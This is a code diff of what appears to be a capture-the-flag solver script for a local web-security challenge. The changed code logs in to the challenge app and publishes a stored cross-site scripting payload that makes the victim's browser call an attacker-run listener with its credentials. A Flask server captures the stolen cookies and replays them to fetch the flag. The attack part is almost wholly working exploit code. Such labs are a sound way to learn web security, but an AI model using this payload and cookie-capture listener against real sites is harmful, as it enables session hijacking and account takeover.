@@ -211,75 +211,86 @@ time.sleep(5)
 print("Visited! Go check if the attack worked!")
 '''
 
+def challenge():
+        os.execv("/challenge/server", ["/challenge/server"])
+        print("Error execv.")
+        exit(1)
+
+def attack():
+        app = Flask(__name__)
+
+        @app.route("/")
+        def get_flag():
+            print(request.cookies)
+            sys.stdout.flush()
+            resp = requests.get("http://challenge.localhost:80/", cookies=request.cookies)
+            print(resp.text)
+            sys.stdout.flush()
+            return f"{resp.text}"
+
+        app.run("challenge.localhost", 30080, use_reloader=False)
+        exit(1)
+
 pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
+pat1 = re.compile(r".*Running on http://challenge.localhost:30080\n")
+challenge_up = False
+attacker_up = False
 r1, w1 = os.pipe()
-pid = os.fork()
 
-if pid == -1:
-	print("Error fork.")
-	exit(1)
+for proc in [challenge, attack]:
+    pid = os.fork()
 
-if pid == 0:
-	os.close(r1)
+    if pid == -1:
+        print("Error fork.")
+        exit(1)
 
-	os.dup2(w1, 1)
-	os.close(w1)
+    if pid == 0:
+        os.close(r1)
 
-	# stdout as stderr
-	os.dup2(1, 2)
+        os.dup2(w1, 1)
+        os.close(w1)
 
-	os.execv("/challenge/server", ["/challenge/server"])
-	print("Error execv.")
-	exit(1)
+	    # stdout as stderr
+        os.dup2(1, 2)
+
+        proc()
 
 os.close(w1)
 
 read_file = os.fdopen(r1, "r")
 
 while True:
-	line = read_file.readline()
-	print(line, end="")
+    line = read_file.readline()
+    print(line, end="")
 
-	m = pat0.match(line)
-	if m:
-		url = "http://challenge.localhost:80/login"
-		data = {"username": "hacker", "password": "1337"}
-		resp = requests.post(url, data=data, allow_redirects=False)
-		cookies = resp.cookies
-		print(cookies)
+    m = pat0.match(line)
+    if m:
+        challenge_up = True
+	
+    m = pat1.match(line)
+    if m:
+        attacker_up = True
 
-		url = "http://challenge.localhost:80/draft"
-		data = {"publish": "True", "content": '<script>fetch("http://challenge.localhost:30080/", {"method": "GET", "credentials": "include"});</script>'}
-		resp = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
+    if challenge_up and attacker_up:
+        challenge_up = False
+        attacker_up = False
+        url = "http://challenge.localhost:80/login"
+        data = {"username": "hacker", "password": "1337"}
+        resp = requests.post(url, data=data, allow_redirects=False)
+        cookies = resp.cookies
+        print(cookies)
 
-		pid = os.fork()
+        url = "http://challenge.localhost:80/draft"
+        data = {"publish": "True", "content": '<script>fetch("http://challenge.localhost:30080/", {"method": "GET", "credentials": "include"});</script>'}
+        resp = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
 
-		if pid == -1:
-			print("Error fork.")
-			exit(1)
+        pid = os.fork()
 
-		if pid == 0:
-			app = Flask(__name__)
+        if pid == -1:
+            print("Error fork.")
+            exit(1)
 
-			@app.route("/")
-			def get_flag():
-				print(request.cookies)
-				sys.stdout.flush()
-				resp = requests.get("http://challenge.localhost:80/", cookies=request.cookies)
-				print(resp.text)
-				sys.stdout.flush()
-				return f"{resp.text}"
-
-			app.run("challenge.localhost", 30080, use_reloader=False)
-			exit(1)
-
-		pid = os.fork()
-
-		if pid == -1:
-			print("Error fork.")
-			exit(1)
-
-		if pid == 0:
-			os.execv("/challenge/victim", ["/challenge/victim"])
-			print("Error execv.")
-			exit(1)
+        if pid == 0:
+            os.execv("/challenge/victim", ["/challenge/victim"])
+            print("Error execv.")
+            exit(1)
